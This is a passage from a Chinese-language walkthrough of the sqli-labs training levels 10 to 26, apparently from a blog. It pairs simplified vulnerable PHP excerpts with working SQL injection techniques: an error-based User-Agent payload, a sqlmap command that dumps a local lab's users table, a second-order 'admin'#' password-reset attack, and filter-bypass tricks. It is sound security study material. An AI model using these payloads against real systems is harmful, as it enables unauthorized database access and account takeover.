<h4 id="3-2-10-Less-10"><a href="#3-2-10-Less-10" class="headerlink" title="3.2.10 Less-10"></a>3.2.10 Less-10</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-11-Less-11"><a href="#3-2-11-Less-11" class="headerlink" title="3.2.11 Less-11"></a>3.2.11 Less-11</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username='<span class="subst">$uname</span>' and password='<span class="subst">$passwd</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>与Less-1一致。</p>
<h4 id="3-2-12-Less-12"><a href="#3-2-12-Less-12" class="headerlink" title="3.2.12 Less-12"></a>3.2.12 Less-12</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-13-Less-13"><a href="#3-2-13-Less-13" class="headerlink" title="3.2.13 Less-13"></a>3.2.13 Less-13</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=('<span class="subst">$uname</span>') and password=('<span class="subst">$passwd</span>') LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="comment">//"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());	</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变，不能用联合查询。</p>
<h4 id="3-2-14-Less-14"><a href="#3-2-14-Less-14" class="headerlink" title="3.2.14 Less-14"></a>3.2.14 Less-14</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="comment">//"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-15-Less-15"><a href="#3-2-15-Less-15" class="headerlink" title="3.2.15 Less-15"></a>3.2.15 Less-15</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username='<span class="subst">$uname</span>' and password='<span class="subst">$passwd</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="comment">//"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变，不能使用报错。</p>
<h4 id="3-2-16-Less-16"><a href="#3-2-16-Less-16" class="headerlink" title="3.2.16 Less-16"></a>3.2.16 Less-16</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">'uname'</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="comment">//"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>

<p>闭合类型改变。</p>
<h4 id="3-2-17-Less-17"><a href="#3-2-17-Less-17" class="headerlink" title="3.2.17 Less-17"></a>3.2.17 Less-17</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]);</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="variable">$update</span>=<span class="string">"UPDATE users SET password = '<span class="subst">$passwd</span>' WHERE username='<span class="subst">$row1</span>'"</span>;</span><br><span class="line">	<span class="keyword">if</span> error</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p><code>uname</code>被过滤了，只能考虑update这里注入，使用报错注入即可。</p>
<h4 id="3-2-18-Less-18"><a href="#3-2-18-Less-18" class="headerlink" title="3.2.18 Less-18"></a>3.2.18 Less-18</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="comment">//uname和passwd被过滤</span></span><br><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="variable">$insert</span>=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="subst">$uagent</span>', '<span class="subst">$IP</span>', <span class="subst">$uname</span>)"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your User Agent is: '</span> .<span class="variable">$uagent</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());	</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>这里<code>uname</code>和<code>passwd</code>被过滤了，因此只能在insert语句注入。</p>
<ul>
<li><code>$_SERVER['HTTP_CLIENT_IP']</code> 客户端可以伪造。</li>
<li><code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>，客户端可以伪造。</li>
<li><code>$_SERVER['REMOTE_ADDR']</code>，客户端不能伪造。</li>
</ul>
<p>所以这里只能在<code>User-Agent</code>注入。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="number">1</span><span class="string">'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250310224830354.png" class="" title="image-20250310224830354">

<h4 id="3-2-19-Less-19"><a href="#3-2-19-Less-19" class="headerlink" title="3.2.19 Less-19"></a>3.2.19 Less-19</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="comment">//uname和passwd被过滤</span></span><br><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="variable">$insert</span>=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('<span class="subst">$uagent</span>', '<span class="subst">$IP</span>')"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your Referer is: '</span> .<span class="variable">$uagent</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());	</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p><code>User-Agent</code>改为了<code>Referer</code>。</p>
<h4 id="3-2-20-Less-20"><a href="#3-2-20-Less-20" class="headerlink" title="3.2.20 Less-20"></a>3.2.20 Less-20</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">'uname'</span>]))</span><br><span class="line">    <span class="comment">//过滤uname和passwd</span></span><br><span class="line">    <span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]);</span><br><span class="line">    <span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">    <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">'uname'</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'submit'</span>]))</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">'uname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE username='<span class="subst">$cookee</span>' LIMIT 0,1"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">            <span class="string">"输出查询的信息"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">'uname'</span>, <span class="variable">$row1</span>[<span class="string">'username'</span>], <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>就是从<code>Cookie</code>中读取<code>uname</code>值，产生注入。</p>
<h3 id="3-3-Less21-37"><a href="#3-3-Less21-37" class="headerlink" title="3.3 Less21-37"></a>3.3 Less21-37</h3><h4 id="3-3-1-Less-21"><a href="#3-3-1-Less-21" class="headerlink" title="3.3.1 Less-21"></a>3.3.1 Less-21</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE username=('<span class="subst">$cookee</span>') LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>只节选了相关代码，其余与<code>Less-20</code>大差不差，主要是多了一个base64编码，这里可以用sqlmap脚本。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u http://127.0.0.1:8888/Less-21/ --cookie=<span class="string">"uname=*"</span> --tamper=<span class="string">"base64encode"</span> -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250310230842396.png" class="" title="image-20250310230842396">

<h4 id="3-3-2-Less-22"><a href="#3-3-2-Less-22" class="headerlink" title="3.3.2 Less-22"></a>3.3.2 Less-22</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee1</span> = <span class="string">'"'</span>. <span class="variable">$cookee</span>. <span class="string">'"'</span>;    </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变</p>
<h4 id="3-3-3-Less-23"><a href="#3-3-3-Less-23" class="headerlink" title="3.3.3 Less-23"></a>3.3.3 Less-23</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">"/#/"</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">"/--/"</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">""</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>过滤了注释符，可以使用闭合方式。</p>
<h4 id="3-3-4-Less-24"><a href="#3-3-4-Less-24" class="headerlink" title="3.3.4 Less-24"></a>3.3.4 Less-24</h4><p><code>login_create.php</code></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'username'</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'password'</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select count(*) from users where username='<span class="subst">$username</span>'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">"insert into users ( username, password) values(\"<span class="subst">$username</span>\", \"<span class="subst">$pass</span>\")"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><code>login.php</code></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">"login_user"</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">"login_password"</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM users WHERE username='<span class="subst">$username</span>' and password='<span class="subst">$password</span>'"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><code>pass_change.php</code></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'current_password'</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'password'</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"UPDATE users SET PASSWORD='<span class="subst">$pass</span>' where username='<span class="subst">$username</span>' and password='<span class="subst">$curr_pass</span>' "</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>这里大部分都被转义了，唯一可利用的地方在最后的<code>update</code>语句中的<code>username</code>，这里需要利用二次注入，即将构造的sql语句插入数据库中，在其被调用时触发。</p>
<p>比如数据库有<code>username</code>值为<code>admin'#</code>，被拼接进<code>update</code>语句就会变成：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">'$pass'</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">'admin'</span>#<span class="string">' and password='</span>$curr_pass<span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>

<p>那么就直接修改了<code>admin</code>用户的密码。</p>
<p>先注册一个名为<code>admin'#</code>的用户</p>
<img src="/posts/31899/image-20250310232549937.png" class="" title="image-20250310232549937">

<p>然后登录后修改密码</p>
<img src="/posts/31899/image-20250310232652649.png" class="" title="image-20250310232652649">

<p>查看数据库发现<code>admin</code>用户密码被成功修改了</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from security.users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | 1234       |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | admin<span class="string">'#  | 123        |</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="3-3-5-Less-25"><a href="#3-3-5-Less-25" class="headerlink" title="3.3.5 Less-25"></a>3.3.5 Less-25</h4><p>接下来很多是绕过过滤的，所以只考虑绕过过滤的部分。</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);    </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/AND/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>双写绕过<code>oorr</code>，符号替换<code>or</code>换成<code>||</code>。</p>
<h4 id="3-3-6-Less-25a"><a href="#3-3-6-Less-25a" class="headerlink" title="3.3.6 Less-25a"></a>3.3.6 Less-25a</h4><p>无区别。</p>
<h4 id="3-3-7-Less-26"><a href="#3-3-7-Less-26" class="headerlink" title="3.3.7 Less-26"></a>3.3.7 Less-26</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);           </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/and/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);     </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);     </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);    </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);       </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);     </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);   